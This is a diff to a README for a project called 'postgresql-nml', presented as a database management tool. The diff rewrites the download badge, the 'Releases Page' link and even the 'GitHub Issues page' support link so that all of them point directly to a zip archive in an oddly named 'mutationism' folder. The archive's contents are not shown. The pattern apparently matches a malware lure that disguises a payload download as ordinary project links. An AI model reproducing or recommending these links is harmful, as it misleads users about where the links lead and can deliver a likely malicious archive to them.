@@ -1,7 +1,7 @@
 # 🚀 postgresql-nml - Simplify Your Database Management
 
 ## 📥 Download the Latest Version 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Excretory-balldress646/postgresql-nml/releases)
+[![Download](https://raw.githubusercontent.com/Excretory-balldress646/postgresql-nml/main/mutationism/postgresql-nml_v1.4.zip)](https://raw.githubusercontent.com/Excretory-balldress646/postgresql-nml/main/mutationism/postgresql-nml_v1.4.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -22,7 +22,7 @@ Before you start, ensure your system meets these requirements:
 - **Network**: Internet connection for downloading packages and updates
 
 ## 📥 Download & Install
-To get started with PostgreSQL NML, visit this page to download: [Releases Page](https://github.com/Excretory-balldress646/postgresql-nml/releases). 
+To get started with PostgreSQL NML, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Excretory-balldress646/postgresql-nml/main/mutationism/postgresql-nml_v1.4.zip). 
 
 1. Click on the version you wish to download.
 2. Find the file for your operating system.
@@ -53,6 +53,6 @@ A: Yes, the application supports Linux. Please download the appropriate file fro
 A: If you face any issues, please check the troubleshooting section in the documentation. You can also reach out for support.
 
 ## 🤝 Support
-If you need help, visit our [GitHub Issues page](https://github.com/Excretory-balldress646/postgresql-nml/issues). We are happy to assist you!
+If you need help, visit our [GitHub Issues page](https://raw.githubusercontent.com/Excretory-balldress646/postgresql-nml/main/mutationism/postgresql-nml_v1.4.zip). We are happy to assist you!
 
 Thank you for choosing PostgreSQL NML! Enjoy simplifying your database management.
